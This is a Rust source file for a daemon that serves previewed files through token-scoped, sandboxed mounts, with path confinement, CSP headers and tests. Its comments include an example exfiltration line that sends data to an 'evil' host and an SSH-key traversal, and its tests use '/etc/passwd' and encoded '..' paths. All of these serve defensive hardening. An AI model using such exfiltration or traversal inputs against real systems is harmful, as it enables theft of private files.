//! Authenticated viewer file serving for browser sessions (gap audit rank 8).
//!
//! Mirrors desktop's `ViewerServerManager` (`src-tauri/src/viewer_server/mod.rs`),
//! but integrates into the daemon's own HTTP server and permission system:
//! - Mounts are registered via `viewer_serve` (behind session auth & path allowlist)
//! - Paths are confined to `mount.root` via `safe_join` (no `..`, no symlinks escape);
//!   the file served is the checked canonical path itself (never re-resolved from a URI)
//! - Paths are checked against the daemon's `PathGuard` allowlist and reserved directories
//! - Content-Security-Policy enforces `sandbox allow-scripts;` (opaque origin, no cookies,
//!   no /api/rpc access)
//! - Supports HTTP Range requests (audio/video seeking) via `tower_http::services::ServeFile` on the already-checked canonical path
//! - Injects artifact bridge, tokens stylesheet, and iyke bridge on `text/html` responses
//! - Token-scoped URLs (`/__viewer/:token/*path`)

use std::path::{Component, Path, PathBuf};
use std::sync::Arc;
use std::time::{Duration, Instant};

use axum::body::Body;
use axum::extract::{Path as AxumPath, State};
use axum::http::{header, HeaderMap, HeaderValue, Method, Request, StatusCode};
use axum::response::{IntoResponse, Response};
use dashmap::DashMap;
use tower::util::ServiceExt;
use tower_http::services::ServeFile;

use super::AppState;

/// Iyke iframe bridge, bundled from `src/lib/iyke/iframe-bridge.entry.ts`.
const IYKE_BRIDGE_JS: &str = include_str!("../../resources/iyke-iframe-bridge.js");
const IYKE_INJECT_MARKER: &str = "<!-- iyke-bridge-injected -->";

/// Ikenga artifact bridge, bundled from `src/lib/artifact/bridge.entry.ts`.
const ARTIFACT_BRIDGE_JS: &str = include_str!("../../resources/artifact-iframe-bridge.js");
const ARTIFACT_INJECT_MARKER: &str = "<!-- ikenga-artifact-bridge-injected -->";

/// `@ikenga/tokens` design tokens stylesheet.
const IKENGA_TOKENS_CSS: &str = include_str!("../../resources/ikenga-tokens.css");

/// Maximum size of HTML to buffer for injection (4 MiB).
const HTML_INJECT_MAX_BYTES: usize = 4 * 1024 * 1024;

/// Content-Security-Policy for viewer-served responses.
///
/// Starts with `sandbox allow-scripts;` so the served page has an opaque origin (`origin: null`).
/// This guarantees:
/// 1. It cannot access `window.parent` DOM or globals.
/// 2. It cannot read the host session cookies (`document.cookie` is empty).
/// 3. Any fetch to `/api/rpc` sends `Origin: null`, which is rejected by the server's origin gate.
///
/// `img-src` and `media-src` carry no `https:` source: a previewed page can read
/// files under its mount (`connect-src 'self'`), and an `https:` image or media
/// URL is a write channel to any host (`new Image().src = "https://evil/?" + data`).
/// Previews are in-app only, so nothing legitimate needs an external fetch.
pub const VIEWER_CSP: &str = "sandbox allow-scripts; default-src 'self' data: blob:; \
script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://cdn.tailwindcss.com https://esm.sh https://cdn.skypack.dev; \
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net https://cdn.tailwindcss.com; \
img-src 'self' data: blob:; \
font-src 'self' data: https://fonts.gstatic.com https://cdn.jsdelivr.net; \
media-src 'self' blob:; \
connect-src 'self'";

/// URL path prefix for viewer routes.
pub const VIEWER_PATH_PREFIX: &str = "/__viewer";

#[derive(Clone, Debug)]
pub struct ViewerMount {
    pub root: PathBuf,
}

/// A mount idle for this long is dropped (its URL stops working). Every served
/// request refreshes it, so an open preview stays alive; a URL that was copied
/// out of the app and never opened again does not stay valid forever.
pub const MOUNT_IDLE_TTL: Duration = Duration::from_secs(60 * 60);

/// At most this many live mounts; the least recently used is evicted first.
const MAX_MOUNTS: usize = 256;

struct MountEntry {
    root: PathBuf,
    last_used: Instant,
}

#[derive(Clone)]
pub struct ViewerService {
    mounts: Arc<DashMap<String, MountEntry>>,
    ttl: Duration,
}

impl Default for ViewerService {
    fn default() -> Self {
        Self::new()
    }
}

impl ViewerService {
    pub fn new() -> Self {
        Self::with_ttl(MOUNT_IDLE_TTL)
    }

    pub fn with_ttl(ttl: Duration) -> Self {
        Self {
            mounts: Arc::new(DashMap::new()),
            ttl,
        }
    }

    /// Register a mount root. The URL token is the *only* credential a
    /// sandboxed viewer page can present (an opaque-origin document sends no
    /// `SameSite` session cookie on its sub-resource requests), so it is a
    /// bearer capability: 192+ bits of randomness, minted only by an
    /// authorized `viewer_serve` call, idle-expiring ([`MOUNT_IDLE_TTL`]) and
    /// revoked by `viewer_stop`. Under multi-user (T1), `principal_id` is
    /// encoded in the token prefix (`<principal_uuid_simple>_<random_hex>`) so
    /// the broker can route sub-resource requests to the principal's own
    /// child; the broker never launches a child for it (a mount lives in the
    /// child's memory, so no running child means no valid mount).
    pub fn register(&self, root: PathBuf, principal_id: Option<uuid::Uuid>) -> (String, String) {
        self.sweep();
        let token = match principal_id {
            Some(pid) => format!("{}_{}", pid.simple(), random_token_hex(24)),
            None => random_token_hex(32),
        };
        self.mounts.insert(
            token.clone(),
            MountEntry {
                root: root.clone(),
                last_used: Instant::now(),
            },
        );
        let url = format!("{VIEWER_PATH_PREFIX}/{token}/");
        tracing::info!(
            "viewer mount: registered {} at {} (token {})",
            root.display(),
            VIEWER_PATH_PREFIX,
            &token[..8]
        );
        (url, token)
    }

    /// Drop idle mounts, then the least recently used ones past the cap.
    fn sweep(&self) {
        let ttl = self.ttl;
        self.mounts.retain(|_, m| m.last_used.elapsed() < ttl);
        while self.mounts.len() >= MAX_MOUNTS {
            let oldest = self
                .mounts
                .iter()
                .min_by_key(|e| e.value().last_used)
                .map(|e| e.key().clone());
            match oldest {
                Some(k) => {
                    self.mounts.remove(&k);
                }
                None => break,
            }
        }
    }

    pub fn unregister(&self, token: &str) {
        if self.mounts.remove(token).is_some() {
            tracing::info!(
                "viewer mount: unregistered token {}",
                &token[..token.len().min(8)]
            );
        }
    }

    pub fn has_token(&self, token: &str) -> bool {
        let expired = match self.mounts.get(token) {
            Some(m) => m.last_used.elapsed() >= self.ttl,
            None => return false,
        };
        if expired {
            self.mounts.remove(token);
        }
        !expired
    }

    /// The mount behind `token`, refreshing its idle clock.
    pub fn get_mount(&self, token: &str) -> Option<ViewerMount> {
        let expired = {
            let mut m = self.mounts.get_mut(token)?;
            if m.last_used.elapsed() >= self.ttl {
                true
            } else {
                m.last_used = Instant::now();
                return Some(ViewerMount {
                    root: m.root.clone(),
                });
            }
        };
        if expired {
            self.mounts.remove(token);
        }
        None
    }
}

pub fn random_token_hex(n_bytes: usize) -> String {
    use rand::RngCore;
    let mut buf = vec![0u8; n_bytes];
    rand::thread_rng().fill_bytes(&mut buf);
    hex::encode(buf)
}

/// Why `viewer_serve` refused a root. Names neither the project root nor any
/// path it was not handed: the caller already knows what it asked for.
pub const ROOT_ABOVE_PROJECT: &str =
    "preview root is above the project root; refusing to widen the viewer mount beyond it";

/// The deepest project root (from the daemon's own `projects` table) that
/// contains `file`, or `None` when the file belongs to no project.
///
/// A root that is, or contains, `home` is skipped: a project registered at the
/// whole home directory bounds nothing, so a file under it falls back to the
/// next project, or to its own directory. The default project has no root.
pub(crate) fn project_root_of(
    file: &Path,
    project_roots: &[PathBuf],
    home: Option<&Path>,
) -> Option<PathBuf> {
    project_roots
        .iter()
        .filter(|r| r.parent().is_some()) // `/` is not a project
        .filter(|r| home.is_none_or(|h| !h.starts_with(r)))
        .filter(|r| file.starts_with(r))
        .max_by_key(|r| r.components().count())
        .cloned()
}

/// Whether a viewer mount rooted at `root` may serve the page `file`
/// (both canonical). The root must contain the file, and may reach no higher
/// than the file's project root, or, for a file in no project, its own
/// directory. A root above that bound is refused, never silently clamped.
///
/// This is the only thing keeping an `<img src="../../../.ssh/id_rsa">` in a
/// hostile page from widening the mount to the whole home (the widened root
/// is computed client-side from the page's own markup).
pub(crate) fn check_root(
    root: &Path,
    file: &Path,
    project_roots: &[PathBuf],
    home: Option<&Path>,
) -> Result<(), String> {
    if !file.starts_with(root) {
        return Err("preview root does not contain the file".to_string());
    }
    let bound = match project_root_of(file, project_roots, home) {
        Some(p) => p,
        None => file
            .parent()
            .map(Path::to_path_buf)
            .ok_or_else(|| "preview file has no directory".to_string())?,
    };
    if root.starts_with(&bound) {
        Ok(())
    } else {
        Err(ROOT_ABOVE_PROJECT.to_string())
    }
}

/// Canonical roots of the active projects in this daemon's `ikenga.db`. Under
/// T1 that is the calling principal's own child database; under a share the
/// Owner's. Unreadable rows (missing directory, no root) are skipped, which
/// can only shrink the set of project roots and so only tighten the bound.
pub(crate) async fn project_roots(state: &AppState) -> Vec<PathBuf> {
    let Some(db) = state.pa_db.as_ref() else {
        return Vec::new();
    };
    let Ok(pool) = db.ensure_reader_pool().await else {
        return Vec::new();
    };
    let rows: Vec<(Option<String>,)> =
        sqlx::query_as("SELECT root_path FROM projects WHERE archived_at IS NULL")
            .fetch_all(&pool)
            .await
            .unwrap_or_default();
    rows.into_iter()
        .filter_map(|(r,)| r)
        .filter(|r| !r.trim().is_empty())
        .filter_map(|r| Path::new(&r).canonicalize().ok())
        .filter(|r| r.is_dir())
        .collect()
}

/// Safely join `root` and `rel`, rejecting traversal segments (`..`), root prefixes,
/// and symlinks that escape `root`.
pub fn safe_join(root: &Path, rel: &str) -> Option<PathBuf> {
    let mut out = root.to_path_buf();
    for comp in Path::new(rel).components() {
        match comp {
            Component::Normal(c) => out.push(c),
            Component::CurDir => {}
            Component::ParentDir | Component::RootDir | Component::Prefix(_) => return None,
        }
    }
    let canonical = out.canonicalize().ok()?;
    if !canonical.starts_with(root) {
        return None;
    }
    Some(canonical)
}

/// Refuse service worker registration attempts on viewer content.
fn refuse_service_worker(headers: &HeaderMap) -> bool {
    super::static_files::is_service_worker_fetch(headers)
}

/// Find index just after opening `<head ...>` tag.
fn find_head_insert(html: &str) -> Option<usize> {
    let bytes = html.as_bytes();
    let mut from = 0;
    while let Some(rel) = html[from..].find("<head") {
        let i = from + rel;
        match bytes.get(i + 5) {
            Some(b'>') | Some(b'/') => return html[i..].find('>').map(|j| i + j + 1),
            Some(c) if c.is_ascii_whitespace() => return html[i..].find('>').map(|j| i + j + 1),
            _ => from = i + 5,
        }
    }
    None
}

/// Inject the Ikenga artifact bridge and tokens stylesheet into HTML.
fn inject_artifact_bridge(html: &str) -> String {
    if html.contains(ARTIFACT_INJECT_MARKER) {
        return html.to_string();
    }
    let script = format!(
        "{ARTIFACT_INJECT_MARKER}\n<style id=\"ikenga-tokens\">\n{IKENGA_TOKENS_CSS}\n</style>\n<script>\n{ARTIFACT_BRIDGE_JS}\n</script>\n"
    );
    let mut out = String::with_capacity(html.len() + script.len());
    if let Some(insert_at) = find_head_insert(html) {
        out.push_str(&html[..insert_at]);
        out.push_str(&script);
        out.push_str(&html[insert_at..]);
    } else if let Some(idx) = html.find("<body") {
        out.push_str(&html[..idx]);
        out.push_str(&script);
        out.push_str(&html[idx..]);
    } else {
        out.push_str(&script);
        out.push_str(html);
    }
    out
}

/// Inject the iyke iframe bridge into HTML.
fn inject_iyke_bridge(html: &str) -> String {
    if html.contains(IYKE_INJECT_MARKER) {
        return html.to_string();
    }
    let script =
        format!("{IYKE_INJECT_MARKER}\n<script type=\"module\">\n{IYKE_BRIDGE_JS}\n</script>\n");
    let mut out = String::with_capacity(html.len() + script.len());
    if let Some(insert_at) = find_head_insert(html) {
        out.push_str(&html[..insert_at]);
        out.push_str(&script);
        out.push_str(&html[insert_at..]);
    } else if let Some(idx) = html.find("<body") {
        out.push_str(&html[..idx]);
        out.push_str(&script);
        out.push_str(&html[idx..]);
    } else {
        out.push_str(&script);
        out.push_str(html);
    }
    out
}

/// Append the request's host origin to CSP directives so relative assets resolve.
pub fn csp_for_host(raw: &str, host: &str) -> String {
    raw.split("; ")
        .map(|directive| {
            let trimmed = directive.trim_end();
            if trimmed.is_empty() {
                return String::new();
            }
            if trimmed.starts_with("sandbox") {
                trimmed.to_string()
            } else {
                format!("{trimmed} http://{host} https://{host}")
            }
        })
        .collect::<Vec<_>>()
        .join("; ")
}

pub async fn serve_viewer_handler(
    State(state): State<Arc<AppState>>,
    AxumPath((token, path)): AxumPath<(String, String)>,
    req: Request<Body>,
) -> Response {
    let Some(mount) = state.viewer.get_mount(&token) else {
        return (StatusCode::NOT_FOUND, "not found").into_response();
    };
    serve_mount_file(&state, &mount.root, &path, req).await
}

pub async fn serve_viewer_root_handler(
    State(state): State<Arc<AppState>>,
    AxumPath(token): AxumPath<String>,
    req: Request<Body>,
) -> Response {
    let Some(mount) = state.viewer.get_mount(&token) else {
        return (StatusCode::NOT_FOUND, "not found").into_response();
    };
    serve_mount_file(&state, &mount.root, "index.html", req).await
}

/// A plain refusal. The body never names a path or a reason: whoever holds a
/// mount token must not learn the daemon's layout from an error.
fn refuse(status: StatusCode) -> Response {
    let body = if status == StatusCode::FORBIDDEN {
        "forbidden"
    } else {
        "not found"
    };
    (status, body).into_response()
}

/// Keep only a `Range` header we can honour: one `bytes=a-b` / `bytes=a-` /
/// `bytes=-n` range. Anything else (another unit, several ranges, garbage) is
/// dropped so the response is a plain 200, which RFC 9110 §14.2 allows, rather
/// than a 416 that a media element cannot recover from.
fn sanitize_range(headers: &mut HeaderMap) {
    let ok = headers
        .get(header::RANGE)
        .and_then(|v| v.to_str().ok())
        .and_then(|v| v.strip_prefix("bytes="))
        .map(|spec| {
            let spec = spec.trim();
            match spec.split_once('-') {
                Some((a, b)) => {
                    let digits = |t: &str| t.bytes().all(|c| c.is_ascii_digit());
                    digits(a) && digits(b) && !(a.is_empty() && b.is_empty())
                }
                None => false,
            }
        })
        .unwrap_or(false);
    if !ok {
        headers.remove(header::RANGE);
        headers.remove(header::IF_RANGE);
    }
}

/// Whether `host` is safe to splice into a CSP source list.
fn host_is_csp_safe(host: &str) -> bool {
    !host.is_empty()
        && host.len() <= 255
        && host
            .bytes()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, b'.' | b'-' | b':' | b'[' | b']'))
}

async fn serve_mount_file(
    state: &AppState,
    root: &PathBuf,
    rel_path: &str,
    mut req: Request<Body>,
) -> Response {
    if req.method() == Method::OPTIONS {
        return Response::builder()
            .status(StatusCode::NO_CONTENT)
            .header(header::ACCESS_CONTROL_ALLOW_ORIGIN, "*")
            .header(header::ACCESS_CONTROL_ALLOW_METHODS, "GET, HEAD, OPTIONS")
            .header(header::ACCESS_CONTROL_ALLOW_HEADERS, "*")
            .body(Body::empty())
            .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response());
    }

    let is_head = req.method() == Method::HEAD;
    if req.method() != Method::GET && !is_head {
        return (StatusCode::METHOD_NOT_ALLOWED, "method not allowed").into_response();
    }

    if refuse_service_worker(req.headers()) {
        return (StatusCode::FORBIDDEN, "forbidden: service worker").into_response();
    }

    // `rel_path` was percent-decoded exactly once, by the router. It is used
    // verbatim from here on: the file that is served is the canonical path the
    // checks below ran on, never a path re-derived from a URI (a second decode
    // would turn `lea%256b` into `leak` after the symlink check had passed).
    let Some(mut target) = safe_join(root, rel_path) else {
        return refuse(StatusCode::NOT_FOUND);
    };
    if target.is_dir() {
        // `sub` -> `sub/`, keeping the `/__viewer/<token>` prefix, so relative
        // assets of `sub/index.html` resolve against the directory.
        let uri_path = req.uri().path();
        if !uri_path.ends_with('/') {
            let mut location = format!("{uri_path}/");
            if let Some(q) = req.uri().query() {
                location.push('?');
                location.push_str(q);
            }
            return Response::builder()
                .status(StatusCode::TEMPORARY_REDIRECT)
                .header(header::LOCATION, location)
                .body(Body::empty())
                .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response());
        }
        let index = format!("{}/index.html", rel_path.trim_end_matches('/'));
        let Some(idx) = safe_join(root, &index) else {
            return refuse(StatusCode::NOT_FOUND);
        };
        target = idx;
    }
    if !target.is_file() {
        return refuse(StatusCode::NOT_FOUND);
    }

    // The same allowlist and reserved-directory gate `fs_read` applies,
    // on every request (the mount root alone is not enough: the allowlist can
    // shrink after `viewer_serve`, and the root may contain the daemon's dirs).
    if let Err(e) = state.path_guard.check(&target) {
        tracing::warn!("viewer: path_guard check refused {}: {e}", target.display());
        return refuse(StatusCode::FORBIDDEN);
    }

    let host = req
        .headers()
        .get(header::HOST)
        .and_then(|h| h.to_str().ok())
        .filter(|h| host_is_csp_safe(h))
        .map(|h| h.to_string());

    let is_html_file = mime_guess::from_path(&target)
        .first()
        .is_some_and(|m| m.essence_str() == "text/html");

    let resp: Response = 'serve: {
        if is_html_file {
            // HTML is always the injected document (200, never a byte range of
            // the raw file), so GET and HEAD describe the same representation.
            let too_big = tokio::fs::metadata(&target)
                .await
                .map(|m| m.len() as usize > HTML_INJECT_MAX_BYTES)
                .unwrap_or(true);
            if !too_big {
                if let Ok(bytes) = tokio::fs::read(&target).await {
                    let out = match std::str::from_utf8(&bytes) {
                        Ok(html) => inject_iyke_bridge(&inject_artifact_bridge(html)).into_bytes(),
                        Err(_) => bytes,
                    };
                    let len = out.len();
                    break 'serve Response::builder()
                        .status(StatusCode::OK)
                        .header(header::CONTENT_TYPE, "text/html; charset=utf-8")
                        .header(header::CONTENT_LENGTH, len)
                        .body(if is_head {
                            Body::empty()
                        } else {
                            Body::from(out)
                        })
                        .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response());
                }
            }
        }
        sanitize_range(req.headers_mut());
        match ServeFile::new(&target).oneshot(req).await {
            Ok(r) => r.into_response(),
            Err(_) => return (StatusCode::INTERNAL_SERVER_ERROR, "serve failed").into_response(),
        }
    };

    let (mut parts, body) = resp.into_parts();

    // Headers common to all responses.
    parts
        .headers
        .insert(header::CACHE_CONTROL, HeaderValue::from_static("no-cache"));
    parts.headers.insert(
        header::X_CONTENT_TYPE_OPTIONS,
        HeaderValue::from_static("nosniff"),
    );
    parts.headers.insert(
        header::REFERRER_POLICY,
        HeaderValue::from_static("no-referrer"),
    );
    parts.headers.insert(
        header::ACCESS_CONTROL_ALLOW_ORIGIN,
        HeaderValue::from_static("*"),
    );

    // The sandbox directive must never be absent: a host that cannot be
    // spliced in safely just gets the base policy.
    let csp = host
        .as_deref()
        .map(|h| csp_for_host(VIEWER_CSP, h))
        .and_then(|c| HeaderValue::from_str(&c).ok())
        .unwrap_or_else(|| HeaderValue::from_static(VIEWER_CSP));
    parts.headers.insert(header::CONTENT_SECURITY_POLICY, csp);

    Response::from_parts(parts, body)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn safe_join_rejects_traversal() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let sub = root.join("sub");
        fs::create_dir_all(&sub).unwrap();
        let file = sub.join("doc.html");
        fs::write(&file, "hi").unwrap();

        assert!(safe_join(root, "sub/doc.html").is_some());
        assert!(safe_join(root, "sub/../sub/doc.html").is_none());
        assert!(safe_join(root, "../doc.html").is_none());
        assert!(safe_join(root, "/etc/passwd").is_none());
    }

    #[test]
    fn safe_join_rejects_symlink_escape() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("root");
        let outside = dir.path().join("outside");
        fs::create_dir_all(&root).unwrap();
        fs::create_dir_all(&outside).unwrap();

        let secret = outside.join("secret.txt");
        fs::write(&secret, "supersecret").unwrap();

        #[cfg(unix)]
        {
            let link = root.join("leak.txt");
            std::os::unix::fs::symlink(&secret, &link).unwrap();
            assert!(safe_join(&root, "leak.txt").is_none());
        }
    }

    #[test]
    fn csp_has_no_external_image_or_media_sources() {
        for d in VIEWER_CSP.split("; ") {
            if d.starts_with("img-src") || d.starts_with("media-src") {
                assert!(!d.contains("http"), "{d}");
                assert!(!d.contains("*"), "{d}");
            }
        }
        // Same after the request's own host is spliced in: only that host.
        let csp = csp_for_host(VIEWER_CSP, "localhost:3000");
        let img = csp.split("; ").find(|d| d.starts_with("img-src")).unwrap();
        assert!(
            !img.split_whitespace()
                .any(|t| t == "https:" || t == "http:"),
            "{img}"
        );
        assert!(VIEWER_CSP.contains("connect-src 'self'"));
    }

    #[test]
    fn csp_contains_sandbox() {
        assert!(VIEWER_CSP.starts_with("sandbox allow-scripts;"));
        let host_csp = csp_for_host(VIEWER_CSP, "localhost:3000");
        assert!(host_csp.contains("sandbox allow-scripts;"));
        assert!(host_csp.contains("http://localhost:3000"));
    }

    #[test]
    fn bridge_injection_ordering() {
        let sample =
            "<!doctype html><html><head><title>Test</title></head><body><h1>Hi</h1></body></html>";
        let injected = inject_artifact_bridge(sample);
        assert!(injected.contains(ARTIFACT_INJECT_MARKER));
        assert!(injected.contains("ikenga-tokens"));
        assert!(injected.contains("window.__ikenga_host__"));

        let iyke = inject_iyke_bridge(&injected);
        assert!(iyke.contains(IYKE_INJECT_MARKER));
        assert!(iyke.contains("iframe-bridge"));
    }

    // ── router-level tests ──────────────────────────────────────────────────

    use axum::http::{header, Request, StatusCode};
    use serde_json::json;
    use tower::ServiceExt;

    struct Fixture {
        /// Canonical temp root; the allowlist root and mount parent.
        root: PathBuf,
        _dir: tempfile::TempDir,
        roots: Arc<crate::fs_roots::FsRoots>,
        db: Option<Arc<crate::db::PaDb>>,
        app: axum::Router,
    }

    /// A T0 router whose allowlist is `root` and whose data dir is `root/data`.
    fn fixture() -> Fixture {
        fixture_with(false, None)
    }

    /// [`fixture`] with a project store (`with_db`: `<root>/data/ikenga.db`)
    /// and a home seam (`home_sub`: a directory under the root).
    fn fixture_with(with_db: bool, home_sub: Option<&str>) -> Fixture {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().canonicalize().unwrap();
        fs::create_dir_all(root.join("data")).unwrap();
        let db =
            with_db.then(|| Arc::new(crate::db::PaDb::new(root.join("data").join("ikenga.db"))));
        let home = home_sub.map(|h| {
            let p = root.join(h);
            fs::create_dir_all(&p).unwrap();
            p
        });
        let roots_file = dir.path().join("roots.json");
        fs::write(
            &roots_file,
            json!({ "roots": [root.to_string_lossy()] }).to_string(),
        )
        .unwrap();
        let roots = Arc::new(crate::fs_roots::FsRoots::load(roots_file).unwrap());
        let config = crate::server::ServerConfig {
            host: "127.0.0.1".into(),
            port: 0,
            static_dir: dir.path().to_path_buf(),
            pkgs_dir: None,
            data_dir: Some(root.join("data")),
            auth_token: Some("secret-token".into()),
            allowed_origins: vec![],
            idle_timeout_secs: None,
            executor_tier: crate::executor::ExecutorTier::T0,
        };
        let app = crate::server::build_router(
            config,
            Arc::new(crate::pty::PtyManager::new()),
            Arc::new(crate::engines::EngineRegistry::new()),
            db.clone(),
            None,
            home,
            crate::server::rpc_shell::PathGuard::roots(roots.clone()),
            None,
            crate::access::DaemonAccess::unavailable(),
            None,
            crate::server::UpdateSource::Default,
        );
        Fixture {
            root,
            _dir: dir,
            roots,
            db,
            app,
        }
    }

    impl Fixture {
        async fn rpc(&self, cmd: &str, args: serde_json::Value) -> serde_json::Value {
            let req = Request::builder()
                .method("POST")
                .uri("/api/rpc")
                .header(header::AUTHORIZATION, "Bearer secret-token")
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from(json!({ "cmd": cmd, "args": args }).to_string()))
                .unwrap();
            let resp = self.app.clone().oneshot(req).await.unwrap();
            let bytes = axum::body::to_bytes(resp.into_body(), 1_000_000)
                .await
                .unwrap();
            serde_json::from_slice(&bytes).unwrap()
        }

        /// Mount `dir` for the first regular file in it and return the token.
        async fn mount(&self, dir: &Path) -> String {
            let mut files: Vec<PathBuf> = fs::read_dir(dir)
                .unwrap()
                .filter_map(|e| e.ok().map(|e| e.path()))
                .filter(|p| p.is_file())
                .collect();
            files.sort();
            let file = files.into_iter().next().expect("a file in the mounted dir");
            self.mount_for(dir, &file).await
        }

        /// `viewer_serve` with `root` for the page `file`; the raw response.
        async fn serve(&self, root: &Path, file: &Path) -> serde_json::Value {
            self.rpc(
                "viewer_serve",
                json!({ "rootDir": root.to_string_lossy(), "filePath": file.to_string_lossy() }),
            )
            .await
        }

        async fn mount_for(&self, root: &Path, file: &Path) -> String {
            let v = self.serve(root, file).await;
            assert!(v["ok"].as_bool().unwrap_or(false), "viewer_serve: {v}");
            v["data"]["token"].as_str().unwrap().to_string()
        }

        /// Register `root` as an active project of this daemon.
        async fn add_project(&self, id: &str, root: &Path) {
            let pool = self.db.as_ref().unwrap().ensure_pool().await.unwrap();
            sqlx::query(
                "INSERT INTO projects (id, display_name, root_path, position, is_default, created_at) \
                 VALUES (?, ?, ?, 1, 0, 0)",
            )
            .bind(id)
            .bind(id)
            .bind(root.to_string_lossy().into_owned())
            .execute(&pool)
            .await
            .unwrap();
        }

        /// A credential-less request, as a sandboxed viewer page makes it.
        async fn get(
            &self,
            method: &str,
            uri: &str,
            headers: &[(&str, &str)],
        ) -> (StatusCode, axum::http::HeaderMap, Vec<u8>) {
            let mut b = Request::builder().method(method).uri(uri);
            for (k, v) in headers {
                b = b.header(*k, *v);
            }
            let resp = self
                .app
                .clone()
                .oneshot(b.body(Body::empty()).unwrap())
                .await
                .unwrap();
            let (status, h) = (resp.status(), resp.headers().clone());
            let bytes = axum::body::to_bytes(resp.into_body(), 10_000_000)
                .await
                .unwrap();
            (status, h, bytes.to_vec())
        }
    }

    #[tokio::test]
    async fn serves_html_css_media_with_sandbox_headers_and_auth() {
        let f = fixture();
        let sub = f.root.join("assets");
        fs::create_dir_all(&sub).unwrap();
        let html =
            "<!doctype html><html><head><title>T</title></head><body><h1>Hello</h1></body></html>";
        fs::write(sub.join("index.html"), html).unwrap();
        fs::write(sub.join("style.css"), "body { color: red; }").unwrap();
        fs::write(sub.join("a.mp3"), vec![0u8; 100]).unwrap();
        fs::write(sub.join("v.mp4"), vec![1u8; 64]).unwrap();
        fs::write(
            sub.join("i.svg"),
            "<svg xmlns='http://www.w3.org/2000/svg'/>",
        )
        .unwrap();

        let res = f
            .rpc("viewer_serve", json!({ "rootDir": sub.to_string_lossy(), "filePath": sub.join("index.html").to_string_lossy() }))
            .await;
        let token = res["data"]["token"].as_str().unwrap().to_string();
        assert_eq!(res["data"]["url"], format!("/__viewer/{token}/"));
        assert!(!token.contains(&sub.to_string_lossy().to_string()));

        // HTML: injected, sandboxed, host spliced into the CSP.
        let (st, h, body) = f
            .get(
                "GET",
                &format!("/__viewer/{token}/index.html"),
                &[("host", "localhost:5173")],
            )
            .await;
        assert_eq!(st, StatusCode::OK);
        let csp = h[header::CONTENT_SECURITY_POLICY].to_str().unwrap();
        assert!(csp.starts_with("sandbox allow-scripts;"), "{csp}");
        assert!(csp.contains("http://localhost:5173"));
        assert!(!csp.contains("allow-same-origin"));
        assert_eq!(h[header::X_CONTENT_TYPE_OPTIONS], "nosniff");
        assert!(h[header::CONTENT_TYPE]
            .to_str()
            .unwrap()
            .starts_with("text/html"));
        let body = String::from_utf8(body).unwrap();
        assert!(body.contains(ARTIFACT_INJECT_MARKER) && body.contains(IYKE_INJECT_MARKER));
        assert!(body.contains("<h1>Hello</h1>"));

        // The bare mount URL serves index.html.
        let (st, _, _) = f.get("GET", &format!("/__viewer/{token}/"), &[]).await;
        assert_eq!(st, StatusCode::OK);

        // Content types; every kind of response carries the sandbox CSP + nosniff.
        for (name, ct) in [
            ("style.css", "text/css"),
            ("a.mp3", "audio/mpeg"),
            ("v.mp4", "video/mp4"),
            ("i.svg", "image/svg+xml"),
        ] {
            let (st, h, _) = f
                .get("GET", &format!("/__viewer/{token}/{name}"), &[])
                .await;
            assert_eq!(st, StatusCode::OK, "{name}");
            assert!(
                h[header::CONTENT_TYPE].to_str().unwrap().starts_with(ct),
                "{name}: {:?}",
                h[header::CONTENT_TYPE]
            );
            assert!(h[header::CONTENT_SECURITY_POLICY]
                .to_str()
                .unwrap()
                .starts_with("sandbox allow-scripts;"));
            assert_eq!(h[header::X_CONTENT_TYPE_OPTIONS], "nosniff", "{name}");
        }

        // A service-worker script fetch is refused.
        let (st, _, _) = f
            .get(
                "GET",
                &format!("/__viewer/{token}/sw.js"),
                &[("service-worker", "script")],
            )
            .await;
        assert_eq!(st, StatusCode::FORBIDDEN);

        // `..` never reaches the route's file lookup.
        let (st, _, _) = f
            .get("GET", &format!("/__viewer/{token}/../secret.txt"), &[])
            .await;
        assert!(
            st == StatusCode::NOT_FOUND || st == StatusCode::BAD_REQUEST,
            "{st}"
        );
        let (st, _, _) = f
            .get("GET", &format!("/__viewer/{token}/%2e%2e/secret.txt"), &[])
            .await;
        assert_eq!(st, StatusCode::NOT_FOUND);
        let (st, _, _) = f
            .get("GET", &format!("/__viewer/{token}/..%2fsecret.txt"), &[])
            .await;
        assert_eq!(st, StatusCode::NOT_FOUND);

        // Credentials: the token is the credential; a wrong one, or a write
        // method, is a 401 (no mount, or the normal auth wall).
        let (st, _, _) = f.get("GET", "/__viewer/deadbeef/index.html", &[]).await;
        assert_eq!(st, StatusCode::UNAUTHORIZED);
        let (st, _, _) = f
            .get("POST", &format!("/__viewer/{token}/index.html"), &[])
            .await;
        assert_eq!(st, StatusCode::UNAUTHORIZED);

        // viewer_stop revokes it.
        let v = f.rpc("viewer_stop", json!({ "token": token })).await;
        assert!(v["ok"].as_bool().unwrap_or(false));
        let (st, _, _) = f
            .get("GET", &format!("/__viewer/{token}/index.html"), &[])
            .await;
        assert_eq!(st, StatusCode::UNAUTHORIZED);
    }

    #[tokio::test]
    async fn viewer_serve_refuses_a_root_outside_the_allowlist() {
        let f = fixture();
        let v = f.serve(Path::new("/etc"), Path::new("/etc/hostname")).await;
        assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");
        // The daemon's own data dir is refused even though it sits inside the root.
        let data = f.root.join("data");
        fs::write(data.join("page.html"), "x").unwrap();
        let v = f.serve(&data, &data.join("page.html")).await;
        assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");
    }

    /// `viewer_serve` without the page it previews cannot be bounded, so it
    /// is refused (an old cached client sends only `rootDir`).
    #[tokio::test]
    async fn viewer_serve_requires_the_file_being_previewed() {
        let f = fixture();
        let v = f
            .rpc(
                "viewer_serve",
                json!({ "rootDir": f.root.to_string_lossy() }),
            )
            .await;
